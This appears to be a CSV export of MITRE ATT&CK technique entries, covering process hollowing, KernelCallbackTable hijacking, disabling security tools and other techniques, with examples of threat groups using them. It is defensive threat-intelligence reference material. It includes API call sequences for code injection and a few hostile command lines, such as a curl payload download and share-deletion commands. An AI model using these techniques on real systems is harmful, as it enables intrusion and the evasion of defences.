T1574.013,KernelCallbackTable,"Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads. The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.  An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading] or [Process Injection] into another process.  A pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API] function). Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.  The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload. Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.","['[Lazarus Group] has abused the <code>KernelCallbackTable</code> to hijack process control flow and execute shellcode.', '[FinFisher] has used the <code>KernelCallbackTable</code> to hijack the execution flow of a process by replacing the <code>__fnDWORD</code> function with the address of a created [Asynchronous Procedure Call] stub routine.']",
T1053.006,Systemd Timers,"Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron] in Linux environments. Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH]  Each <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service] unit files that are managed by the systemd system and service manager. Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.  An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.",[],False
T1542.004,ROMMONkit,"Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect.    ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot] an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",[],
T1218.001,Compiled HTML File,"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.  CHM content is displayed using underlying components of the Internet Explorer browser  loaded by the HTML Help executable program (hh.exe).   A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution] CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.  ","['[OilRig] has used a CHM payload to load and execute another malicious file once delivered to a victim.', '[Dark Caracal] leveraged a compiled HTML file that contained a command to download and run an executable.', '[Silence] has weaponized CHM files in their phishing campaigns.', '[APT41] used compiled HTML (.chm) files for targeting. ', '[APT38] has used CHM files to move concealed payloads.', '[Astaroth] uses ActiveX objects for file execution and manipulation. ', '[Lazarus Group] has used CHM files to move concealed payloads.']",False
T1070.005,Network Share Connection Removal,Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares] connections can be removed when no longer needed. [Net] is an example utility that can be used to remove network share connections with the <code>net use \\system\share /delete</code> command. ,"['The <code>net use \\\\system\\share /delete</code> command can be used in [Net] to remove an established connection to a network share.', '[RobbinHood] disconnects all network shares from the computer with the command <code>net use * /DELETE /Y</code>.', ' [InvisiMole] can disconnect previously connected remote drives.', '[Threat Group-3390] has detached network shares after exfiltrating files, likely to evade detection.']",False
T1090.003,Multi-hop Proxy,"Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.  For example, adversaries may construct or use onion routing networks – such as the publicly available [Tor] network – to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.  In the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., [Network Devices] By leveraging [Patch System Image] on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the [Network Boundary Bridging] method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.  Similarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.","['[Keydnap] uses a copy of tor2web proxy for HTTPS communications.', '[MacSpy] uses [Tor] for command and control.', '[GreyEnergy] has used [Tor] relays for Command and Control servers.', '[Ursnif] has used [Tor] for C2.', '[Attor] has used [Tor] for C2 communication.', '[APT28] has routed traffic over [Tor] and VPN servers to obfuscate their activities.', 'During [CostaRicto] the threat actors used a layer of proxies to manage C2 communications. ', '[Inception] used chains of compromised routers to proxy C2 communications between them and cloud service providers.', '[Leviathan] has used multi-hop proxies to disguise the source of their malicious traffic.', 'During [Operation Wocao] threat actors executed commands through the installed web shell via [Tor] exit nodes.', '[Uroburos] can use implants on multiple compromised machines to proxy communications through its worldwide P2P network. ', ""[FIN4] has used [Tor] to log in to victims' email accounts."", '[Siloscape] uses [Tor] to communicate with C2.', 'A backdoor used by [APT29] created a [Tor] hidden service to forward traffic from the [Tor] client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network and has also used TOR.', '[Ninja] has the ability to use a proxy chain with up to 255 hops when using TCP.', 'Traffic traversing the [Tor] network will be forwarded to multiple nodes before exiting the [Tor] network and continuing on to its intended destination.', '[NKAbuse] has abused the NKN public blockchain protocol for its C2 communications.', '[Dok] downloads and installs [Tor] via homebrew.', '[Cyclops Blink] has used [Tor] nodes for C2 traffic.', '[NGLite] has abused NKN infrastructure for its C2 communication.', '[StrongPity] can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.', '[Industroyer] used [Tor] nodes for C2.', '[WannaCry] uses [Tor] for command and control traffic.', '[Dridex] can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.', '[Kobalos] can chain together multiple compromised machines as proxies to reach their final targets.', '[Operation Wocao] has executed commands through the installed web shell via Tor exit nodes.', '[CostaRicto] has used a layer of proxies to manage C2 communications.']",False
T1059.004,Unix Shell,"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.  Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.  Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH] Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.","['[NKAbuse] is initially installed and executed through an initial shell script.', '[Turian] has the ability to use <code>/bin/sh</code> to execute commands.', '[TeamTNT] has used shell scripts for execution.', '[Bundlore] has leveraged /bin/sh and /bin/bash to execute commands on the victim machine.', '[Penquin] can execute remote commands using bash scripts.', '[Kinsing] has used Unix shell scripts to execute commands in the victim environment.', '[Kobalos] can spawn a new pseudo-terminal and execute arbitrary commands at the command prompt. ', '[Rocke] used shell scripts to run commands which would obtain persistence and execute the cryptocurrency mining malware.\t', '[Derusbi] is capable of creating a remote Bash shell and executing commands.', '[PULSECHECK] can use Unix shell script for command execution.', '[Chaos] provides a reverse shell connection on 8338/TCP, encrypted via AES.', '[COATHANGER] provides a BusyBox reverse shell for command and control.', '[Drovorub] can execute arbitrary commands as root on a compromised system.', '[OSX_OCEANLOTUS.D] uses a shell script as the main executable inside an app bundle and drops an embedded base64-encoded payload to the <code>/tmp</code> folder.', '[Anchor] can execute payloads via shell scripting.', '[LoudMiner] used shell scripts to launch various services and to start/stop the QEMU virtualization.\t', '[AppleJeus] has used shell scripts to execute commands after installation and set persistence mechanisms.', '[WindTail] can use the <code>open</code> command to execute an application.', '[OSX/Shlayer] can use bash scripts to check the macOS version, download payloads, and extract bytes from files. [OSX/Shlayer] uses the command <code>sh -c tail -c +1381...</code> to extract bytes at an offset from a specified file. [OSX/Shlayer] uses the <code>curl -fsL ""$url"" >$tmp_path</code> command to download malicious payloads into a temporary directory.', '[NETWIRE] has the ability to use <code>/bin/bash</code> and <code>/bin/sh</code> to execute commands.', '[Kazuar] uses /bin/bash to execute commands on the victim’s machine.', '[Doki] has executed shell scripts with /bin/sh.', '[CoinTicker] executes a bash script to establish a reverse shell.', '[ZIPLINE] can use `/bin/sh` to create a reverse shell and execute commands. ', '[PITSTOP] has the ability to receive shell commands over a Unix domain socket.', '[APT41] executed <code>file /bin/pwd</code> in activity exploiting CVE-2019-19781 against Citrix devices.', '[PACEMAKER] can use a simple bash script for execution.', '[Green Lambert] can use shell scripts for execution, such as <code>/bin/sh -c</code>. ', '[Skidmap] has used <code>pm.sh</code> to download and install its main payload.', '[MacMa] can execute supplied shell commands and uses bash scripts to perform additional actions.', '[CallMe] has the capability to create a reverse shell on victims.', '[Exaramel for Linux] has a command to execute a shell command on the system.', '[CookieMiner] has used a Unix shell script to run a series of commands targeting macOS.', '[XCSSET] uses a shell script to execute Mach-o files and <code>osacompile</code> commands such as, <code>osacompile -x -o xcode.app main.applescript</code>.', ""[Proton] uses macOS' .command file type to script actions."", '[Hildegard] has used shell scripts for execution.', '[Fysbis] has the ability to create and execute commands in a remote shell for CLI.']",False
T1137.003,Outlook Forms,"Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.  Once malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.",['[Ruler] can be used to automate the abuse of Outlook Forms to establish persistence.'],
T1562.001,Disable or Modify Tools,"Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.  Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking] adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.   Adversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.   On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.  In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.  Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.  Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation] which may lead to bypassing anti-tampering features.","['[RunningRAT] kills antimalware running process.', '[SUNBURST] attempted to disable software security services following checks against a FNV-1a + XOR hashed hardcoded blocklist.', '[Diavol] can attempt to stop security software.', '[TA2541]  has attempted to disable built-in security protections such as Windows AMSI. ', '[H1N1] kills and disables services for Windows Security Center, and Windows Defender.', '[Turla] has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products.', '[Ryuk] has stopped services related to anti-virus.', '[Netwalker] can detect and terminate active security software-related processes on infected systems.', '[SILENTTRINITY] `amsiPatch.py` module can disable Antimalware Scan Interface (AMSI) functions.', ""[REvil] can connect to and disable the Symantec server on the victim's network."", '[Cobalt Strike] has the ability to use Smart Applet attacks to disable the Java SecurityManager sandbox.', '[POWERSTATS] can disable Microsoft Office Protected View by changing Registry keys.', '[LockerGoga] installation has been immediately preceded by a ""task kill"" command in order to disable anti-virus.', ""[ChChes] can alter the victim's proxy configuration."", '[Avaddon] looks for and attempts to stop anti-malware solutions.', '[Ebury] can disable SELinux Role-Based Access Control and deactivate PAM modules.', '[WhisperGate] can download and execute AdvancedRun.exe to disable the Windows Defender Theat Protection service and set an exclusion path for the C:\\ drive.', ""[MuddyWater] can disable the system's local proxy settings."", '[Clop] can uninstall or disable security products.', '[NanHaiShu] can change Internet Explorer settings to reduce warnings about malware activity.', '[Carberp] has attempted to disable security software by creating a suspended process for the security software and injecting code to delete antivirus core files when the process is resumed.', ' [ZIPLINE] can add itself to the exclusion list for the Ivanti Connect Secure Integrity Checker Tool if the `--exclude` parameter is passed by the `tar` process.', '[WarzoneRAT] can disarm Windows Defender during the UAC process to evade detection.', 'During the [SolarWinds Compromise] [APT29] used the service control manager on a remote system to disable services associated with security monitoring products.', '[JPIN] can lower security settings by changing Registry keys.', '[Indrik Spider] used [PsExec] to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring.', '[Ember Bear] has executed a batch script designed to disable Windows Defender on a compromised host.', '[MegaCortex] was used to kill endpoint security processes.', '[Bazar] has manually loaded ntdll from disk in order to identity and remove API hooks set by security products.\t', '[Pysa] has the capability to stop antivirus services and disable Windows Defender. ', '[StrongPity] can add directories used by the malware to the Windows Defender exclusions list to prevent detection.', '[DarkGate] will terminate processes associated with several security software products if identified during execution.', '[TeamTNT] has disabled and uninstalled security tools such as Alibaba, Tencent, and BMC cloud monitoring agents on cloud-based infrastructure.', '[FIN6] has deployed a utility script named <code>kill.bat</code> to disable anti-virus.', '[HDoor] kills anti-virus found on the victim.', '[TA505] has used malware to disable Windows Defender.', '[Gamaredon Group] has delivered macros which can tamper with Microsoft Office security settings.\t', '[Hildegard] has modified DNS resolvers to evade DNS monitoring tools.', '[Grandoreiro] can hook APIs, kill processes, break file system paths, and change ACLs to prevent security tools from running.', '[KOCTOPUS] will attempt to delete or disable all Registry keys and scheduled tasks related to Microsoft Security Defender and Security Essentials.', '[Meteor] can attempt to uninstall Kaspersky Antivirus or remove the Kaspersky license; it can also add all files and folders related to the attack to the Windows Defender exclusion list.', ""[Goopy] has the ability to disable Microsoft Outlook's security policies to disable macro warnings.\t"", '[ThiefQuest] uses the function <code>kill_unwanted</code> to obtain a list of running processes and kills each process matching a list of security related processes.', '[TrickBot] can disable Windows Defender.', '[BRONZE BUTLER] has incorporated code into several tools that attempts to terminate anti-virus processes.', '[RobbinHood] will search for Windows services that are associated with antivirus software on the system and kill the process. ', '[Gorgon Group] malware can attempt to disable security features in Microsoft Office and Windows Defender using the <code>taskkill</code> command.', 'Malware used by [Putter Panda] attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).', '[Magic Hound] has disabled antivirus services on targeted systems in order to upload malicious payloads.', '[Aquatic Panda] has attempted to stop endpoint detection and response (EDR) tools on compromised systems.', '[Babuk] can stop anti-virus services on a compromised host.', '[Metamorfo] has a function to kill processes associated with defenses and can prevent certain processes from launching. ', '[Gold Dragon] terminates anti-malware processes if they’re found running on the system.', '[EKANS] stops processes related to security and management software.', '[Lazarus Group] malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally, [Lazarus Group] malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.. ', '[Egregor] has disabled Windows Defender to evade protections.', '[SslMM] identifies and kills anti-malware processes.', '[Agent Tesla] has the capability to kill any running analysis processes and AV software.', '[TinyZBot] can disable Avira anti-virus.', '[DarkComet] can disable Security Center functions like anti-virus.', ""[ZxShell] can kill AV products' processes. "", ""[NanoCore] can modify the victim's anti-virus."", '[Kimsuky] has been observed turning off Windows Security Center and can hide the AV software window from the view of the infected user.', '[Conficker] terminates various services related to system security and Windows.', '[Rocke] used scripts which detected and uninstalled antivirus software.', '[Ragnar Locker] has attempted to terminate/stop processes and services associated with endpoint security products.', '[Donut] can patch Antimalware Scan Interface (AMSI), Windows Lockdown Policy (WLDP), as well as exit-related [Native API] functions to avoid process termination.\t', '[Wizard Spider] has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing.', ""[Maze] has disabled dynamic analysis and other security tools including IDA debugger, x32dbg, and OllyDbg. It has also disabled Windows Defender's Real-Time Monitoring feature and attempted to disable endpoint protection services."", 'During [Cutting Edge] threat actors disabled logging and modified the `compcheckresult.cgi` component to edit the Ivanti Connect Secure built-in Integrity Checker exclusion list to evade detection.', ""[macOS.OSAMiner] has searched for the Activity Monitor process in the System Events process list and kills the process if running. [macOS.OSAMiner] also searches the operating system's `install.log` for apps matching its hardcoded list, killing all matching process names."", '[Proton] kills security tools like Wireshark that are running.', '[Skidmap] has the ability to set SELinux to permissive mode.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] modified in-registry internet settings to lower internet security. ', '[Brave Prince] terminates antimalware processes.', '[QakBot] has the ability to modify the Registry to add its binaries to the Windows Defender exclusion list.', 'During [Night Dragon] threat actors disabled anti-virus and anti-spyware tools in some instances on the victim’s machines. The actors also disabled proxy settings to allow direct communication from victims to the Internet.', '[Unknown Logger] has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.', '[Bundlore] can change browser security settings to enable extensions to be installed. [Bundlore] uses the <code>pkill cfprefsd</code> command to prevent users from inspecting processes.', '[Imminent Monitor] has a feature to disable Windows Task Manager.\t', '[APT29] has disabled Purview Audit on targeted accounts prior to stealing emails from  Microsoft 365 tenants.', '[APT29] used the service control manager on a remote system to disable services associated with security monitoring products.', '[UNC2452] used the service control manager on a remote system to disable services associated with security monitoring products.', '[Night Dragon] has disabled anti-virus and anti-spyware tools in some instances on the victim’s machines. The actors have also disabled proxy settings to allow direct communication from victims to the Internet.', '[OSX/Shlayer] can disable Gatekeeper using the native <code>spctl</code> application.']",False
T1584.006,Web Services,"Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service] [Exfiltration Over Web Service] or [Phishing] Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.","['[Turla] has frequently used compromised WordPress sites for C2 infrastructure.', '[Earth Lusca] has compromised Google Drive repositories.']",False
T1027.005,Indicator Removal from Tools,"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.  A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.","['The author of [GravityRAT] submitted samples to VirusTotal for testing, showing that the author modified the code to try to hide the DDE object in a different part of the document.', '[Cobalt Strike] includes a capability to modify the Beacon payload to eliminate known signatures or unpacking methods.', '[Patchwork] apparently altered [NDiskMonitor] samples by adding four bytes of random letters in a likely attempt to change the file hashes.', '[PowerSploit] <code>Find-AVSignature</code> AntivirusBypass module can be used to locate single byte anti-virus signatures.', '[Deep Panda] has updated and modified its malware, resulting in different hash values that evade detection.', '[GALLIUM] ensured each payload had a unique hash, including by using different types of packers.', '[Penquin] can remove strings from binaries.', 'During [Operation Wocao] threat actors edited variable names within the [Impacket] suite to avoid automated detection.', '[QakBot] can make small changes to itself in order to change its checksum and hash value.', 'In the [Triton Safety Instrumented System Attack] [TEMP.Veles] modified files based on the open-source project cryptcat in an apparent attempt to decrease anti-virus detection rates.', '[Waterbear] can scramble functions not to be executed again with random values.', 'Analysis of [Daserf] has shown that it regularly undergoes technical improvements to evade anti-virus detection.', '[SUNBURST] source code used generic variable names and pre-obfuscated strings, and was likely sanitized of developer comments before being added to [SUNSPOT] ', '[InvisiMole] has undergone regular technical improvements in an attempt to evade detection.', '[OilRig] has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.', 'Based on comparison of [Gazer] versions, [Turla] made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.', '[APT3] has been known to remove indicators of compromise from tools.', '[TEMP.Veles] has modified files based on the open-source project cryptcat in an apparent attempt to decrease AV detection rates.', '[Operation Wocao] has edited variable names within the Impacket suite to avoid automated detection.', '[Cobalt Strike] includes a capability to modify the ""beacon"" payload to eliminate known signatures or unpacking methods.']",False
T1204.003,Malicious Image,"Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware] and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.  Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location]",['[TeamTNT] has relied on users to download and execute malicious Docker images.'],
T1543.005,Container Service,"Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.  For example, by using the `docker run` or `podman run` command with the `restart=always` directive, a container can be configured to persistently restart on the host. A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.  In Kubernetes environments, DaemonSets allow an adversary to persistently [Deploy Container] on all nodes, including ones added later to the cluster. Pods can also be deployed to specific nodes using the `nodeSelector` or `nodeName` fields in the pod spec.  Note that containers can also be configured to run as [Systemd Service]",[],False
T1585.001,Social Media Accounts,"Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.  For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.   Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others. These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service]","['[Sandworm Team] has established social media accounts to disseminate victim internal-only documents and other sensitive data.', 'For [Operation Dream Job] [Lazarus Group] created fake LinkedIn accounts for their targeting efforts.', '[EXOTIC LILY] has established social media profiles to mimic employees of targeted companies.', '[HEXANE] has established fraudulent LinkedIn accounts impersonating HR department employees to target potential victims with fake job offers.', '[Kimsuky] has created social media accounts to monitor news and security trends as well as potential targets.', '[Leviathan] has created new social media accounts for targeting efforts.', '[CURIUM] has established a network of fictitious social media accounts, including on Facebook and LinkedIn, to establish relationships with victims, often posing as an attractive woman.', '[Cleaver] has created fake LinkedIn profiles that included profile photos, details, and connections.', 'For [Operation Ghost] [APT29] registered Twitter accounts to host C2 nodes.', '[Lazarus Group] has created new Twitter accounts to conduct social engineering against potential victims.', '[APT32] has set up Facebook pages in tandem with fake websites.', '[Fox Kitten] has used a Twitter account to communicate with ransomware victims.', '[Magic Hound] has created fake LinkedIn and other social media accounts to contact targets and convince them--through messages and voice communications--to open malicious links.']",
T1055.012,Process Hollowing,"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.    Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.  This is very similar to [Thread Local Storage] but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ","['[Gorgon Group] malware can use process hollowing to inject one of its trojans into another process.', 'A [Threat Group-3390] tool can spawn `svchost.exe` and inject the payload into that process.', '[RCSession] can launch itself from a hollowed svchost.exe process.', '[Denis] performed process hollowing through the API calls CreateRemoteThread, ResumeThread, and Wow64SetThreadContext.', '[Woody RAT] can create a suspended notepad process and write shellcode to delete a file into the suspended process using `NtWriteVirtualMemory`. ', '[Azorult] can decrypt the payload into memory, create a new suspended process of itself, then inject a decrypted payload to the new process and resume new process execution.', 'A [Patchwork] payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.', '[QakBot] can use process hollowing to execute its main payload.', '[Cobalt Strike] can use process hollowing for execution.', '[Lokibot] has used process hollowing to inject itself into legitimate Windows process. ', ' [Snip3] can use RunPE to execute malicious payloads within a hollowed Windows process. ', '[Bandook] has been launched by starting iexplore.exe and replacing it with [Bandook] payload.', '[Smoke Loader] spawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware.', '[Astaroth] can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code.', '[Dtrack] has used process hollowing shellcode to target a predefined list of processes from <code>%SYSTEM32%</code>.', '[TA2541] has used process hollowing to execute CyberGate malware.', '[WhisperGate] has the ability to inject its fourth stage into a suspended process created by the legitimate Windows utility `InstallUtil.exe`.', '[BADNEWS] has a command to download an .exe and use process hollowing to inject it into a new process.', '[Clambling] can execute binaries through process hollowing.', '[menuPass] has used process hollowing in iexplore.exe to load the [RedLeaves] implant.', '[ISMInjector] hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.', 'The [Saint Bot] loader has used API calls to spawn `MSBuild.exe` in a suspended state before injecting the decrypted [Saint Bot] binary into it.', 'The [NETWIRE] payload has been injected into benign Microsoft executables via process hollowing.', '[Agent Tesla] has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code. ', 'Some [Orz] versions have an embedded DLL known as MockDll that uses process hollowing and [Regsvr32] to execute another payload.', '[TrickBot] injects into the svchost.exe process.', '[Ursnif] has used process hollowing to inject into child processes.', ""[Kimsuky] has used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing."", '[Bazar] can inject into a target process including Svchost, Explorer, and cmd using process hollowing.', '[BBSRAT] has been seen loaded into msiexec.exe through process hollowing to hide its execution.', '[Duqu] is capable of loading executable code via process hollowing.', '[DarkGate] leverages process hollowing techniques to evade detection, such as decrypting the content of an encrypted PE file and injecting it into the process vbc.exe.', '[Cobalt Strike] can use process hollowing for execution.']",False
T1564.009,Resource Forking,"Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code. Usage of a resource fork is identifiable when displaying a file’s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.  Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.","[""[Keydnap] uses a resource fork to present a macOS JPEG or text file icon rather than the executable's icon assigned by the operating system."", '[OSX/Shlayer] has used a resource fork to hide a compressed binary file of itself from the terminal, Finder, and potentially evade traditional scanners.']",False
T1110.004,Credential Stuffing,"Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.  Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.  Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:  * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / Terminal Services (3389/TCP) * HTTP/HTTP Management Services (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP)  In addition to management services, adversaries may ""target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as Office 365.","[""[Chimera] has used credential stuffing against victim's remote services to obtain valid accounts."", 